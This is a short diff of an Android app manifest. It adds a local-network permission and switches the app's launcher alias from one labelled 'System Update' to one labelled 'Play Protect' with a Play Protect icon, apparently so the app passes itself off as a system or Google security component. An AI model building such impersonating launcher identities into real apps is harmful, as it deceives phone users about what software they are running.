@@ -5,6 +5,7 @@
     <!-- Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_LOCAL_NETWORK" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
@@ -138,7 +139,7 @@
 
         <activity-alias
             android:name=".SystemUpdateAlias"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
             android:label="System Update"
             android:icon="@mipmap/ic_system_update_adaptive"
@@ -180,7 +181,7 @@
 
         <activity-alias
             android:name=".SettingsAlias"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true"
             android:label="Play Protect"
             android:icon="@drawable/playprotect"
